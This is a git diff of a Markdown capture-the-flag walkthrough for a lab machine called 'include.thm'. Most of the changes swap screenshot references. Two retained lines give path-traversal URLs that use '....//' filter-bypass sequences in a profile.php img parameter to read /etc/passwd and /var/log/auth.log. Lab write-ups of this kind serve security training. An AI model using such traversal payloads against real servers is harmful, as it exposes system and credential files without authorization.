@@ -218,22 +218,23 @@ http://include.thm:4000
 
 ![include](./images/http4000.png)
 
-![include](./images/isAdmin.png)
-
-![include](./images/getAPI.png)
+![include](./images/isAdminfalse.png)
+![include](./images/isAdmintrue.png)
+![include](./images/getapi.png)
+![include](./images/base64.png)
+![include](./images/b64Pass.png)
 
 ```bash
 http://include.thm:50000
 ```
-![include](./images/http50000.png)
+![include](./images/sysmon.png)
 
-![include](./images/pngimg.png)
+![include](./images/imgpng.png)
 
 ### http://10.48.167.80:50000/profile.php?img=....//....//....//....//....//....//....//....//....//etc/passwd
 ![include](./images/etcpasswd.png)
 
 ### http://10.48.167.80:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/log/auth.log
-![include](./images/auth.png)
 
 ```bash
  ┌──(mxjoi㉿outsider)-[~/CTF]
